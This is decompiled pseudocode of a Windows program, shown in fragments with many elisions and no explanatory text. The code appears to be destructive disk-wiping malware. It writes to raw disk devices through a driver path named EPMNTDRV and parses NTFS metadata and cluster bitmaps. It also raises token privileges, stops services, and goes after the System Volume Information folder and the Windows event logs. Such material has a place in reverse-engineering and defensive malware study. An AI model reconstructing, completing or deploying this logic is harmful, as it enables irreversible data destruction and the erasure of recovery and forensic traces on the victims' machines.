...
// int __usercall sub_4011E0@<eax>(unsigned int a1@<edx>, int a2@<ecx>, unsigned __int64 a3, int a4);
// int __usercall sub_401370@<eax>(unsigned int a1@<edx>, int a2@<ecx>, __int64 a3, unsigned int a4, unsigned int a5, __int64 a6);
// BOOL __usercall sub_401490@<eax>(HANDLE hDevice@<ecx>, unsigned __int64 **a2@<edx>, DWORD *a3);
// _DWORD *__usercall sub_401590@<eax>(_DWORD *a1@<edx>, int a2@<ecx>, unsigned __int64 a3, __int64 a4, int a5, int dwBytes);
...
int __stdcall sub_402330(int, int); // weak
...
int __stdcall sub_4028D0(PCWSTR psz1, int, int); // idb
...
int __stdcall sub_402F30(PCWSTR pszFirst, int, int); // idb
int __thiscall sub_402FD0(HANDLE hObject, int); // idb
...
// int __usercall sub_403620@<eax>(int (__stdcall *a1)(char *, struct _WIN32_FIND_DATAW *, int)@<edx>, const unsigned __int16 *a2@<ecx>, int (__stdcall *a3)(char *, struct _WIN32_FIND_DATAW *, int), int a4);
...
// int __usercall sub_4040C0@<eax>(wint_t *a1@<edx>, int a2@<ecx>, unsigned int a3);
// int __usercall sub_404130@<eax>(unsigned int a1@<edx>, unsigned int *a2@<ecx>, unsigned int a3, int a4, _DWORD *a5);
// void __usercall sub_4041A0(int a1@<edx>, size_t a2@<ecx>, int a3, int a4, int a5, int a6, unsigned int *a7, void (__stdcall *a8)(int *, unsigned int *));
_DWORD *__cdecl sub_404500(int a1, int a2, int a3, int a4, void (__stdcall *a5)(int *, unsigned int *));
// char __usercall sub_4045F0@<al>(int a1@<edx>, int a2, char a3, void (__stdcall *a4)(int, int));
unsigned int *__stdcall sub_4047F0(unsigned int *a1, _DWORD *a2);
unsigned int __stdcall sub_404940(int a1, int a2);
char *__stdcall sub_404A10(char *a1, _DWORD *a2);
BOOL __fastcall sub_404C00(PCWSTR pszStart, int a2, int a3);
// int except_handler3();
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);
// int _except_handler3(void); weak
...
wchar_t asc_4051F0[5] = L"\\\\.\\"; // weak
unsigned __int16 word_405548[2] = { 46u, 0u }; // weak
__int128 xmmword_405888 = 0x5800450044004E00490024003A003Ai64; // weak
__int128 xmmword_405898 = 0x5400410043004F004C004C0041005Fi64; // weak
const WCHAR word_4058B0 = 58u; // idb
...
int __usercall sub_4011E0@<eax>(unsigned int a1@<edx>, int a2@<ecx>, unsigned __int64 a3, int a4)
{
  ...
  v4 = a1 + a3 - 1;
  v16 = v4 >> 5;
  LODWORD(v6) = (7 - (a3 & 7)) >> 32;
  v5 = 7 - (a3 & 7);
  HIDWORD(v6) = ((_BYTE)a1 + (_BYTE)a3 - 1) & 7;
  v7 = 128;
  while ( (unsigned int)v6 | v5 )
  {
    LODWORD(v6) = (__PAIR64__(v6, v5--) - 1) >> 32;
    v7 = (v7 | 0x100) >> 1;
  }
  v8 = v7 | 0xFFFFFF00;
  v9 = 1;
  ...
  while ( result || v12 <= v16 )
  {
    ...
    v15 = *(_DWORD *)(a2 + 4 * v12);
    if ( a4 )
      *(_DWORD *)(a2 + 4 * v12) = v14 | v15;
    else
      *(_DWORD *)(a2 + 4 * v12) = v15 & ~v14;
    ++v12;
    result = HIDWORD(v4) >> 5;
  }
  return result;
        ...
        __int64 a6)
{
  ...
  bool j; // cc
  int result; // eax
  unsigned __int64 i; // [esp+Ch] [ebp-14h]
  unsigned int v22; // [esp+18h] [ebp-8h]
  unsigned int v24; // [esp+2Ch] [ebp+Ch]
  unsigned int v25; // [esp+34h] [ebp+14h]

  v6 = a5;
  v7 = a2;
  v8 = a3 - a6;
  v10 = a5 < (unsigned __int64)(a3 - a6) >> 32;
  v11 = a5 <= (unsigned __int64)(a3 - a6) >> 32;
  for ( i = __PAIR64__((unsigned __int64)(a3 - a6) >> 32, a1); ; v11 = v6 <= HIDWORD(i) )
  {
    v24 = v6;
    v22 = a4;
    if ( !v11 || !v10 && a4 >= v8 )
    ...
    if ( ((1 << (a4 & 0x1F)) & *(_DWORD *)(v7 + 4 * (__PAIR64__(v6, a4) >> 5))) == 0 )
      break;
LABEL_15:
    v6 = (__PAIR64__(v24, a4++) + 1) >> 32;
    v10 = v6 < HIDWORD(i);
  }
  v12 = a6 + a4;
  v25 = (a6 + __PAIR64__(v6, a4)) >> 32;
  v13 = a2;
  if ( ((1 << ((a6 + a4 - 1) & 0x1F)) & *(_DWORD *)(a2 + 4 * ((a6 + __PAIR64__(v6, a4) - 1) >> 5))) != 0 )
  {
LABEL_14:
    v8 = a3 - a6;
    v7 = v13;
  ...
  v16 = a4 + 1;
  v15 = (__PAIR64__(v6, a4) + 1) >> 32;
  v14 = v16;
  v17 = __PAIR64__(v25, v12) - 2;
  v18 = v15 < (__PAIR64__(v25, v12) - 2) >> 32;
  for ( j = v15 <= (__PAIR64__(v25, v12) - 2) >> 32; j && (v18 || v14 < (unsigned int)v17); j = v15 <= HIDWORD(v17) )
  {
    v13 = a2;
    if ( ((1 << (v14 & 0x1F)) & *(_DWORD *)(a2 + 4 * (__PAIR64__(v15, v14) >> 5))) != 0 )
    {
      a4 = v22;
      goto LABEL_14;
    }
...
// 401490: using guessed type __int64 InBuffer;

//----- (00401590) --------------------------------------------------------
_DWORD *__usercall sub_401590@<eax>(
        _DWORD *a1@<edx>,
        int a2@<ecx>,
        unsigned __int64 a3,
        __int64 a4,
        ...
        int dwBytes)
{
  ...
  struct _FILETIME SystemTimeAsFileTime; // [esp+10h] [ebp-18h] BYREF
...
int __fastcall sub_401870(LPCWSTR lpFileName, int a2, int a3)
{
  ...
  int v8; // eax
  __int128 v9[2]; // [esp+10h] [ebp-3Ch] BYREF
  ...
  *(_DWORD *)String1 = *(_DWORD *)(a2 + 3);
  ...
  else
  {
    ...
    if ( result )
    {
      ...
      v12 = v20;
      v7 = sub_4010B0(*(_QWORD *)(a2 + 48), (unsigned int)v6);
      sub_401590(a4, a3, a5 + v7, v12, v13, v6);
      v14 = *(unsigned __int16 *)(a2 + 11);
      v8 = sub_4010B0(*(_QWORD *)(a2 + 56), (unsigned int)v6);
      sub_401590(a4, a3, a5 + v8, (unsigned int)v6, v14, v6);
      return v15;
    }
  }
  return result;
}
// 401B80: using guessed type DWORD var_60[14];
...
int __stdcall sub_401D10(int a1, int a2, int a3, _DWORD *a4, unsigned __int64 a5)
{
  ...
  sub_401590(a4, a3, a5, v6, *(unsigned __int16 *)(a2 + 11), v6);
  return 1;
}
...
DWORD __stdcall sub_401FE0(LPCWSTR lpRootPathName, int a2)
{
  ...
  int v22; // edi
  unsigned int v23; // kr20_4
  bool v24; // cc
  HANDLE v25; // eax
  __int64 v27; // [esp-10h] [ebp-258h]
  int v28; // [esp-8h] [ebp-250h]
  int v29; // [esp-4h] [ebp-24Ch]
        ...
        do
        {
          ...
          if ( ((1 << (v14 & 0x1F)) & v6[(unsigned int)(v13 >> 5) + 4]) != 0 )
          {
            ...
            if ( __SPAIR64__(v15, v31 + 1) < __SPAIR64__(v32, v10) )
            {
              ...
              while ( __SPAIR64__(v15, v16) < __SPAIR64__(v32, v10) );
              LODWORD(v34) = v15;
            }
            v17 = BytesPerSector;
            v18 = SectorsPerCluster;
            v29 = SectorsPerCluster * BytesPerSector;
            v28 = BytesPerSector;
            v19 = sub_4010B0(__PAIR64__(v34, v16) - __PAIR64__(v30, v31), BytesPerSector);
            v27 = sub_4010B0(v19, v18);
            v20 = sub_4010B0(v18 * (unsigned __int64)v17, __SPAIR64__(v30, v31));
            sub_401590(v39, a2, *((_QWORD *)v38 + 2) + v20, v27, v28, v29);
            HIDWORD(v13) = v34;
            v21 = v16;
            v6 = lpMem;
          }
          ...
          v31 = v21 + 1;
          v23 = v21 + 1;
          HIDWORD(v13) = (__PAIR64__(HIDWORD(v13), v21) + 1) >> 32;
          v14 = v21 + 1;
          v9 = v22 == 0;
          v10 = v22 - 1;
          v30 = HIDWORD(v13);
...
int __fastcall sub_4023C0(PCWSTR psz1, int a2)
{
  ...
  int result; // eax
  __int64 v18; // [esp-10h] [ebp-2A0h]
  int v19; // [esp-8h] [ebp-298h]
  DWORD BytesPerSector; // [esp+14h] [ebp-27Ch] BYREF
  _QWORD *v22; // [esp+18h] [ebp-278h]
  ...
  int InBuffer[2]; // [esp+58h] [ebp-238h] BYREF
  __int128 OutBuffer; // [esp+60h] [ebp-230h] BYREF
  __int128 v36; // [esp+70h] [ebp-220h]
  WCHAR FileName[4]; // [esp+88h] [ebp-208h] BYREF
  WCHAR RootPathName[256]; // [esp+90h] [ebp-200h] BYREF
  ...
  if ( !FileW || FileW == (HANDLE)-1 )
  {
    GetLastError();
    if ( !v4 || v4 == (void *)-1 )
      return sub_404C00(psz1, v27);
  }
  if ( !StrCmpNW(v2, L"\\??\\", 4) || !StrCmpNW(v2, L"\\\\?\\", 4) )
    v2 += 4;
  v5 = (char *)((char *)RootPathName - (char *)v2);
  *(_QWORD *)FileName = *(_QWORD *)L"\\\\.\\";
  RootPathName[0] = asc_4051F0[4];
  do
  {
    v6 = *v2++;
  ...
  while ( v6 );
  RootPathName[2] = 0;
  if ( GetDiskFreeSpaceW(RootPathName, &SectorsPerCluster, &BytesPerSector, 0, 0) )
  {
    ...
    if ( v7 )
    {
      ...
      {
        ProcessHeap = GetProcessHeap();
        v10 = HeapAlloc(ProcessHeap, 8u, 0x80u);
        v22 = v10;
        if ( v10 )
        {
          if ( DeviceIoControl((HANDLE)v8, 0x560000u, 0, 0, v10, 0x80u, &BytesReturned, 0) )
          {
            ...
            do
            {
              ...
              if ( sub_404130(DWORD2(v36), HIDWORD(v36), &v23) )
              {
                v19 = BytesPerSector;
                v18 = sub_4010B0(__PAIR64__(v28, v31) - *((_QWORD *)&OutBuffer + 1), (unsigned int)v14);
                v15 = sub_4010B0((unsigned int)v14, *((__int64 *)&v36 + 1));
                sub_401590(v23, v27, v22[2] + v15, v18, v19, v14);
                v26 = 1;
              }
              v4 = v32;
              v11 = v24;
...
// 404130: using guessed type _DWORD __cdecl sub_404130(_DWORD, _DWORD, _DWORD);
// 4051F0: using guessed type wchar_t asc_4051F0[5];
...
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  ...
  char v14[40]; // [esp+20h] [ebp-230h] BYREF
  ...
  if ( !v2 )
    return 87;
  v10 = *((_DWORD *)lpThreadParameter + 3);
  NumberOfBytesWritten = 0;
  wnsprintfW(pszDest, 260, L"\\\\.\\EPMNTDRV\\%u", v10);
  v3 = sub_401870(pszDest, (int)v14, 0);
  v4 = (void *)v3;
  if ( !v3 || v3 == -1 )
    goto LABEL_15;
    ...
    if ( __SPAIR64__(v6, v5) < v7 )
    {
      do
      {
        ...
        if ( !WriteFile(v4, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
          GetLastError();
        v6 = (nNumberOfBytesToWrite + (unsigned __int64)v5) >> 32;
        v5 += nNumberOfBytesToWrite;
        v8 = *((_QWORD *)v2 + 1) + *((_QWORD *)v2 + 2);
        HIDWORD(nNumberOfBytesToWrite) = v6;
      }
      while ( __SPAIR64__(v6, v5) < v8 );
    }
    v2 = (int *)*v2;
  }
...
// 4026A0: using guessed type char var_230[40];
...
// 4027F0: using guessed type HANDLE Handles[100];
...
// 403930: using guessed type int __fastcall sub_403930(_DWORD, _DWORD);
...
// 4029D0: using guessed type WCHAR pszDest[260];
// 4029D0: using guessed type wchar_t Destination[260];
...
int __thiscall sub_402FD0(HANDLE hObject, int a2)
{
  ...
  DWORD v14; // eax
  HANDLE v15; // eax
  __int64 v17; // [esp-18h] [ebp-90h]
  unsigned int v18; // [esp-Ch] [ebp-84h]
  __int64 v19; // [esp-8h] [ebp-80h]
  DWORD v20; // [esp+Ch] [ebp-6Ch]
  _DWORD *v21; // [esp+10h] [ebp-68h]
  unsigned int v23; // [esp+18h] [ebp-60h]
  int v24; // [esp+1Ch] [ebp-5Ch]
  _DWORD *v25; // [esp+20h] [ebp-58h]
  BOOL v26; // [esp+24h] [ebp-54h]
  unsigned int v27; // [esp+28h] [ebp-50h]
  unsigned int v28; // [esp+30h] [ebp-48h]
  unsigned int v29; // [esp+34h] [ebp-44h]
  unsigned int v30; // [esp+38h] [ebp-40h]
  DWORD BytesReturned; // [esp+3Ch] [ebp-3Ch] BYREF
  unsigned __int64 InBuffer; // [esp+40h] [ebp-38h] BYREF
  unsigned __int64 v33; // [esp+48h] [ebp-30h] BYREF
  struct _FILETIME SystemTimeAsFileTime; // [esp+50h] [ebp-28h] BYREF
  HANDLE v35[2]; // [esp+58h] [ebp-20h] BYREF
  unsigned __int64 v36; // [esp+60h] [ebp-18h]
  unsigned __int64 v37; // [esp+68h] [ebp-10h]
  unsigned int v38; // [esp+70h] [ebp-8h]
  ...
  while ( 2 )
  {
    ...
    while ( v10 || v9 > 1 )
    {
      ...
      v25 = (_DWORD *)(a2 + 12);
      v11 = *(_DWORD *)(a2 + 12);
      LODWORD(v19) = *(_DWORD *)(v11 + 8);
      v29 = *(_DWORD *)(v11 + 12);
      HIDWORD(v19) = v29;
      v12 = sub_401160(*(_QWORD *)&SystemTimeAsFileTime, v19);
      v18 = HIDWORD(v12);
      v28 = v12;
      HIDWORD(v17) = *(_DWORD *)(v11 + 12);
      HIDWORD(v12) = v11 + 16;
      v30 = v18;
      v13 = *(_DWORD *)(v11 + 8);
      v24 = HIDWORD(v12);
      LODWORD(v17) = v13;
      if ( sub_401370((unsigned int)&v33, SHIDWORD(v12), v17, v12, v18, __SPAIR64__(v10, v9))
        || sub_401370((unsigned int)&v33, v24, __PAIR64__(v29, v13) - __PAIR64__(v30, v28), 0, 0, __SPAIR64__(v10, v9)) )
      {
        v35[0] = hObject;
        v36 = InBuffer;
        v37 = v33;
        v38 = v9;
        v26 = DeviceIoControl(*(HANDLE *)a2, 0x90074u, v35, 0x20u, 0, 0, &BytesReturned, 0);
        if ( v26 )
        {
          v5 = v21;
          if ( (v21[7] & v21[6]) != -1 )
          {
            sub_4011E0(v9, *v25 + 16, v33, 1);
            sub_4011E0(v9, *v25 + 16, *((_QWORD *)v21 + 3), 0);
          }
          goto LABEL_15;
        }
        v14 = GetLastError();
...
// 402FD0: using guessed type HANDLE var_20[2];
      ...
      for ( i = 0; i < 0x10; ++i )
      {
        ...
        *((_DWORD *)lpThreadParameter + 5) = i;
        if ( !WaitForSingleObject(v10, 0) )
          break;
        sub_403620(sub_403290, lpThreadParameter);
      }
      v3 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
    }
...
DWORD __stdcall sub_4034D0(HANDLE *lpThreadParameter)
{
  ...
  sub_4038A0(sub_403430, lpThreadParameter);
  WaitForSingleObject(*lpThreadParameter, 0xFFFFFFFF);
  lpThreadParameter[27] = 0;
  return 0;
}
// 403537: conditional instruction was optimized away because %cSubKeys.4!=0
// 4038A0: using guessed type int __fastcall sub_4038A0(_DWORD, _DWORD);

//----- (00403620) --------------------------------------------------------
int __usercall sub_403620@<eax>(
        int (__stdcall *a1)(char *, struct _WIN32_FIND_DATAW *, int)@<edx>,
        const unsigned __int16 *a2@<ecx>,
        int (__stdcall *a3)(char *, struct _WIN32_FIND_DATAW *, int),
        int a4)
{
  int v4; // edi
  unsigned int v5; // ebx
  ...
  struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-270h] BYREF
  int (__stdcall *v31)(char *, struct _WIN32_FIND_DATAW *, int); // [esp+264h] [ebp-1Ch]
...
// 4038A0: using guessed type WCHAR Buffer[216];
...
BOOL __fastcall sub_403930(const WCHAR *a1, const WCHAR *a2)
{
  ...
  struct _SERVICE_STATUS ServiceStatus; // [esp+Ch] [ebp-30h] BYREF
...
void __noreturn start()
{
  ...
  int v29; // edi
  __int64 v30; // rdi
  int v31[173]; // [esp+0h] [ebp-7F8h]
  BOOL v32; // [esp+2B4h] [ebp-544h]
  PTOKEN_PRIVILEGES v33; // [esp+2B8h] [ebp-540h]
  DWORD v34; // [esp+2BCh] [ebp-53Ch]
  PTOKEN_PRIVILEGES v35; // [esp+2C0h] [ebp-538h]
  SIZE_T v36; // [esp+2C4h] [ebp-534h]
  int v37; // [esp+2D4h] [ebp-524h] BYREF
  struct _FILETIME TokenHandle; // [esp+2D8h] [ebp-520h] BYREF
  int v39; // [esp+2E0h] [ebp-518h] BYREF
  int v40; // [esp+2E4h] [ebp-514h] BYREF
  int pNumArgs; // [esp+2E8h] [ebp-510h] BYREF
  struct _FILETIME v42; // [esp+2ECh] [ebp-50Ch] BYREF
  int v43; // [esp+2F4h] [ebp-504h] BYREF
  struct _FILETIME SystemTimeAsFileTime; // [esp+2F8h] [ebp-500h] BYREF
  int Parameter; // [esp+300h] [ebp-4F8h] BYREF
  int v46; // [esp+304h] [ebp-4F4h]
  WCHAR Name[2]; // [esp+308h] [ebp-4F0h] BYREF
  int v48; // [esp+30Ch] [ebp-4ECh]
  int v49; // [esp+310h] [ebp-4E8h]
  int v50; // [esp+314h] [ebp-4E4h]
  int v51; // [esp+318h] [ebp-4E0h]
  int v52; // [esp+31Ch] [ebp-4DCh]
  int v53; // [esp+320h] [ebp-4D8h]
  int v54; // [esp+324h] [ebp-4D4h]
  int v55; // [esp+328h] [ebp-4D0h]
  int v56; // [esp+32Ch] [ebp-4CCh]
  ...
  if ( v0[1] )
  {
    ...
    v3 = StrToIntW;
    v5 = v4;
    v42.dwLowDateTime = v4;
    goto LABEL_9;
  }
LABEL_8:
  v5 = 35;
  v42.dwLowDateTime = 35;
LABEL_9:
  if ( v2 )
    v6 = v3(v2);
  else
  ...
  v46 = v7;
  ProcessHeap = GetProcessHeap();
  v9 = (char *)HeapAlloc(ProcessHeap, 8u, v36);
  *(_DWORD *)Name = 6619219;
  v48 = 6815827;
  v49 = 7602293;
  v50 = 7274596;
  ...
  if ( OpenProcessToken(CurrentProcess, 0x28u, (PHANDLE)&TokenHandle) )
  {
    ...
    v31[2 * FindFileData.cFileName[0]] = 7209079;
    v31[2 * v13 + 1] = 7471184;
...
LABEL_21:
      if ( sub_4029D0(&v39) )
      {
        ...
        sub_404C00(L"C:\\System Volume Information", (int)&v40);
        ...
        sub_404C00(L"\\\\?\\C:\\Windows\\System32\\winevt\\Logs", (int)&v37);
        v28 = SystemTimeAsFileTime.dwHighDateTime;
        GetSystemTimeAsFileTime(&v42);
        v29 = 60000 * v46;
        v30 = (unsigned int)v29 - sub_401000(v42.dwLowDateTime - v29, v42.dwHighDateTime - v28, 10000, 0);
        if ( v30 < 0 )
          LODWORD(v30) = 0;
        Sleep(v30);
        SetEvent(hEvent[0]);
  ...
  HeapFree(v12, (DWORD)v35, (LPVOID)v36);
  goto LABEL_21;
}
...
int __usercall sub_404130@<eax>(unsigned int a1@<edx>, unsigned int *a2@<ecx>, unsigned int a3, int a4, _DWORD *a5)
{
  ...
  if ( !*a2 )
    return 0;
  for ( i = (unsigned __int64 *)(a2 + 6); ; i += 3 )
  {
    LODWORD(v8) = sub_401000(*i, a1);
...
// 404160: variable 'v8' is possibly undefined

//----- (004041A0) --------------------------------------------------------
void __usercall sub_4041A0(
        int a1@<edx>,
        size_t a2@<ecx>,
        int a3,
        int a4,
        ...
        int a6,
        unsigned int *a7,
        void (__stdcall *a8)(int *, unsigned int *))
{
  ...
  wchar_t *v34; // eax
  HANDLE v35; // eax
  wchar_t *Sourcea; // [esp+10h] [ebp-8h]
  ...
  if ( !v14 )
  {
    ...
    v30 = (int)v9 + v28;
    if ( (char *)v9 + v28 + 26 > (char *)v9 + v28 + v29 )
      return;
    while ( 1 )
    {
...
LABEL_57:
      ...
      if ( v30 + 26 > (unsigned int)v9 + v9[4] + *((unsigned __int16 *)v9 + 10) )
        return;
    }
    wcsncpy(v34, Sourcea, Counta);
    v31[Counta] = 0;
LABEL_55:
    sub_404500(*(_DWORD *)(v30 + 16), *(unsigned __int16 *)(v30 + 20), *(unsigned __int16 *)(v30 + 24), a7, a8);
    if ( v31 )
    {
      v35 = GetProcessHeap();
      HeapFree(v35, 0, v31);
  ...
  if ( v18 )
  {
    ...
    *v20 = 0;
    ...
    if ( v23 )
    {
      wcsncpy(v21, (const wchar_t *)((char *)v9 + *((unsigned __int16 *)v9 + 5)), v23);
...
// 404500: using guessed type _DWORD __cdecl sub_404500(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4045F0: using guessed type _DWORD __cdecl sub_4045F0(_DWORD, _DWORD, _DWORD);
// 4057D4: using guessed type wchar_t aData[6];
// 4057F8: using guessed type wchar_t aIndexAllocatio[18];
// 40587C: using guessed type wchar_t aI30[5];
...
_DWORD *__cdecl sub_404500(int a1, int a2, int a3, int a4, void (__stdcall *a5)(int *, unsigned int *))
{
  ...
  int InBuffer[2]; // [esp+18h] [ebp-8h] BYREF
...
LABEL_11:
  ...
  if ( v8[3] != 1162627398 || (*((_BYTE *)v8 + 34) & 1) == 0 )
    goto LABEL_4;
  sub_4041A0(v18, (size_t)(v8 + 3), v12, v13, v14, v15, (unsigned int *)a4, a5);
  v10 = GetProcessHeap();
  return (_DWORD *)HeapFree(v10, 0, v8);
}
// 404515: variable 'v5' is possibly undefined
// 4045B7: variable 'v12' is possibly undefined
// 4045B7: variable 'v13' is possibly undefined
// 4045B7: variable 'v14' is possibly undefined
// 4045B7: variable 'v15' is possibly undefined
  ...
  if ( a3 || (LOBYTE(v5) = a2, (*(_BYTE *)(a2 + 44) & 2) != 0) )
  {
    ...
    if ( *v6 )
    {
      ...
      do
      {
        ...
        if ( v39 )
        {
          v20 = (unsigned __int64)(char)v38[v31] >> 32;
          v21 = (char)v38[v31];
        }
        else
        {
        ...
        if ( v35 > v7 )
        {
          do
          {
            v20 = (v38[v22] + (__PAIR64__(v20, v21) << 8)) >> 32;
            v21 = v38[v22] + (v21 << 8);
            v22 = v35 - 1;
            v35 = v22;
          }
...
LABEL_13:
      ...
      return sub_401590(v23, a2[18], *(_QWORD *)&v21[6 * v9 + 4] + v18, v19, v20, v16);
    }
  }
  return result;
}
// 404854: variable 'v7' is possibly undefined
// 4048B3: variable 'v14' is possibly undefined
    ...
    if ( v9 < result )
    {
      do
      {
        ...
        if ( !v7
          ...
          && !sub_4040C0((wint_t *)(v9 + 82), *(_DWORD *)(a2 + 52), *(unsigned __int8 *)(v9 + 80)) )
        {
          v10 = *(unsigned __int16 *)(v9 + 4);
          if ( v10 | *(_DWORD *)v9 )
          {
            result = (unsigned int)sub_404500(
                                     *(_DWORD *)v9,
                                     v10,
                                     *(_DWORD *)v9,
                                     a2,
                                     (void (__stdcall *)(int *, unsigned int *))sub_4047F0);
            if ( v7 )
              break;
          }
        }
                        ...
                        v14 += *(unsigned __int16 *)(v14 + 8) )
                  {
                    ...
                    if ( v9 )
                    {
                      if ( v9 != *(unsigned __int8 *)(v14 + 80) )
                        continue;
                      if ( sub_4040C0((wint_t *)(v14 + 82), a2[13], *(unsigned __int8 *)(v14 + 80)) )
                      {
                        v11 = v18;
LABEL_28:
                        v12 = v19;
                    ...
                    {
                      sub_404500(v12, v11, v11, (int)a2, (void (__stdcall *)(int *, unsigned int *))sub_4047F0);
                      v11 = v18;
                      if ( v9 )
                        goto LABEL_35;
                      goto LABEL_28;
...
BOOL __fastcall sub_404C00(PCWSTR pszStart, int a2, int a3)
{
  ...
  struct _BY_HANDLE_FILE_INFORMATION FileInformation; // [esp+10h] [ebp-E4h] BYREF
  ...
  Size = 2 * v9;
  *(_OWORD *)Src = xmmword_405888;
  v32 = 2 * v9 + 48;
  *(_OWORD *)&Src[16] = xmmword_405898;
  *(_QWORD *)&Src[32] = 0x4E004F0049i64;
  ProcessHeap = GetProcessHeap();
      ...
      && (memset(v40, 0, 40), v18 = GetProcessHeap(), (v19 = (unsigned int *)HeapAlloc(v18, 0, 0x60u)) != 0) )
    {
            ...
            (*(_DWORD *)&v40[36] = v23) != 0) )
      {
        *(_DWORD *)&v40[32] = v19[11] / v23;
        ...
        {
          sub_404500(Size, nFileIndexHigh_low, v25, (int)v40, (void (__stdcall *)(int *, unsigned int *))sub_404940);
          if ( v43 || (v27 = *(_DWORD *)&v40[56]) == 0 )
          {
            sub_404500(Size, nFileIndexHigh_low, v26, (int)v40, (void (__stdcall *)(int *, unsigned int *))sub_404A10);
            v27 = *(_DWORD *)&v40[56];
          }
          v42 = v27 != 0;
        }
...
// 404F41: variable 'v25' is possibly undefined
// 404F6E: variable 'v26' is possibly undefined
// 4051F0: using guessed type wchar_t asc_4051F0[5];
// 405888: using guessed type __int128 xmmword_405888;
// 405898: using guessed type __int128 xmmword_405898;
